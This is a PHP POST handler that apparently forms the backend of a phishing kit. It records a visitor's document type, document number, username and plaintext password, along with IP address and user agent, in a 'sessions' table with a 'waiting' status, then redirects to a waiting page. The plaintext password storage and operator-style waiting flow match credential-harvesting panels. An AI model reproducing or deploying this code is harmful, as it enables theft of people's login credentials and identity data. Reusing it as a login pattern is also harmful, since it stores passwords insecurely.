<?php
require_once __DIR__ . '/../core/db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $session_id_post = $_POST['session_id'] ?? '';
    $doc_type = $_POST['doc_type'] ?? '';
    $doc_num = $_POST['doc_number'] ?? '';
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $pdo = getDB();

    $session_id = '';
    if (!empty($session_id_post)) {
        $stmt = $pdo->prepare("SELECT session_id FROM sessions WHERE session_id = ?");
        $stmt->execute([$session_id_post]);
        if ($stmt->fetch()) {
            $session_id = $session_id_post;
        }
    }

    if (empty($session_id)) {
        // Generate unique session ID
        $session_id = bin2hex(random_bytes(16));
        $stmt = $pdo->prepare("
            INSERT INTO sessions (session_id, doc_type, doc_num, username, password, ip, user_agent, status, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'waiting', ?)
        ");
        $stmt->execute([$session_id, $doc_type, $doc_num, $username, $password, $ip, $user_agent, time()]);
    } else {
        // Overwrite the existing session data
        $stmt = $pdo->prepare("
            UPDATE sessions 
            SET doc_type=?, doc_num=?, username=?, password=?, ip=?, user_agent=?, status='waiting', last_seen=? 
            WHERE session_id=?
        ");
        $stmt->execute([$doc_type, $doc_num, $username, $password, $ip, $user_agent, time(), $session_id]);
    }

    // Redirect to waiting page
    header("Location: ../wait.php?id=" . urlencode($session_id) . "&from=login");
    exit;
} else {
    header("Location: ../index.php");
    exit;
}
?>
